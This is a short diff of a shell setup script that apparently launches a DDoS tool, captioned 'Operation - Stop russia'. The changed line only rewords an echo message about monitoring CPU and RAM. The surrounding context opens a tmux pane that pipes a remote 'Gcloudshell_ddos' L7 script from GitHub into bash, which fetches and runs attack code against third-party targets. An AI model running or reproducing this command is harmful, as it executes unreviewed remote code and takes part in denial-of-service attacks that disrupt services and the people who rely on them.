@@ -13,7 +13,7 @@ python3 -m pip install -r requirements.txt
 cd ~
 
 echo -e " \v Operation - Stop russia \v  "
-echo -e "For control CPU&RAM usage enter - top \v in this tab"
+echo -e "For control CPU&RAM usage enter - top\v here"
 sleep 1
 tmux split-window -v -p 90 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7 | bash'
 sleep 0.1
